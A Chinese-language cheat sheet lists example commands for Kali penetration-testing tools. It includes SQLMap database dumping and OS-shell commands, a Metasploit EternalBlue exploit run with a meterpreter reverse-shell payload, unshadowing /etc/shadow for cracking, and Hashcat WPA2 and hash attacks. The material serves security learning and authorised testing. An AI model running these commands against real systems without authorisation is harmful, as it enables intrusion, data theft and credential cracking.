Nmap · 端口扫描/主机发现

Kali Linux 预装 · 信息收集阶段最核心工具
# 基础快速扫描（默认扫1000常用端口）
nmap <target_ip>
# 全端口+服务版本+操作系统 全能扫描（渗透标准操作）
nmap -sV -A -T4 <target_ip>
# 扫描全端口(1-65535)
nmap -p- -T4 <target_ip>
# 内网网段存活主机扫描（不扫端口，速度极快）
nmap -sn 192.168.1.0/24
# SYN半开扫描（隐蔽，不建立完整TCP连接）
sudo nmap -sS -sV -T4 <target_ip>
🎣

SQLMap · SQL注入自动化

Python 编写 · 自动检测并利用SQL注入漏洞
# 检测URL参数是否存在注入
sqlmap -u "http://example.com/product.php?id=1"
# 列出所有数据库
sqlmap -u "http://example.com/product.php?id=1" --dbs
# 指定数据库，列出所有表
sqlmap -u "http://example.com/product.php?id=1" -D target_db --tables
# 导出指定表的所有数据（拖库）
sqlmap -u "http://example.com/product.php?id=1" -D target_db -T users --dump
# POST请求注入
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=123"
# 启动交互Shell（需要高权限）
sqlmap -u "http://example.com/product.php?id=1" --os-shell

Metasploit (MSF) · 漏洞利用框架

渗透测试界最强大框架 · 内置2000+漏洞利用模块
# 启动MSF控制台
msfconsole
# 搜索漏洞模块（以永恒之蓝MS17-010为例）
msf6 > search ms17-010
# 加载漏洞利用模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue
# 查看需要配置的参数
msf6 > show options
# 设置攻击目标IP
msf6 > set RHOSTS 192.168.1.100
# 设置反弹Shell载荷和本机IP
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.128
# 检测目标是否存在漏洞
msf6 > check
# 执行攻击
msf6 > exploit

Hashcat · GPU加速密码破解

世界最快密码破解工具 · 支持300+哈希算法
# 常用参数说明：
-m 指定哈希类型 (0=MD5, 100=SHA1, 1000=NTLM, 2500=WPA/WPA2, 3200=bcrypt)
-a 指定破解模式 (0=字典, 3=掩码暴力)
-o 结果输出文件
--force 忽略警告
# 字典破解MD5哈希
hashcat -m 0 -a 0 hash.txt rockyou.txt --force
# 掩码暴力破解8位数字密码
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d --force
# 破解WiFi握手包(WPA2)
hashcat -m 2500 -a 0 capture.hccapx rockyou.txt --force
# 显示已经破解的结果
hashcat -m 0 hash.txt --show
💉

Burp Suite · Web渗透测试框架

Web安全瑞士军刀 · 抓包改包/扫描/爆破/重放一体化
# 浏览器代理设置
127.0.0.1:8080，导入Burp CA证书才能抓HTTPS包
# 核心模块说明：
Proxy → 拦截/修改HTTP/HTTPS请求响应
Repeater → 重放修改后的请求，手工测试漏洞
Intruder → 自动化爆破（密码、参数fuzz）
Scanner → 自动漏洞扫描（Pro版）
Decoder → 编码解码（URL/Base64/HEX等）
Comparer → 两次响应差异对比
# 典型工作流：
浏览器开代理 → Proxy拦截数据包 → 发送到Repeater修改测试 → 发现漏洞点发送到Intruder批量爆破 → 提交漏洞
⚡

Wireshark · 网络流量分析

抓包分析工具 · 深度解析上千种网络协议
# 常用过滤表达式：
http → 只显示HTTP流量
tcp.port == 80 → 过滤80端口TCP流量
ip.addr == 192.168.1.100 → 过滤指定IP流量
tcp.flags.syn == 1 → 只看SYN包（扫描探测）
http.request.method == "POST" → 只看POST请求
arp → ARP协议，内网主机发现
# 典型用途：
排查网络故障、分析攻击流量、提取明文密码、还原HTTP文件、内网流量审计。

John the Ripper · 密码破解

经典开源离线密码破解工具
# 破解Linux /etc/shadow密码
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=rockyou.txt hashes.txt
# 破解Zip压缩包密码
zip2john protected.zip > zip_hash.txt
john --wordlist=rockyou.txt zip_hash.txt
# 查看破解结果
john --show hashes.txt
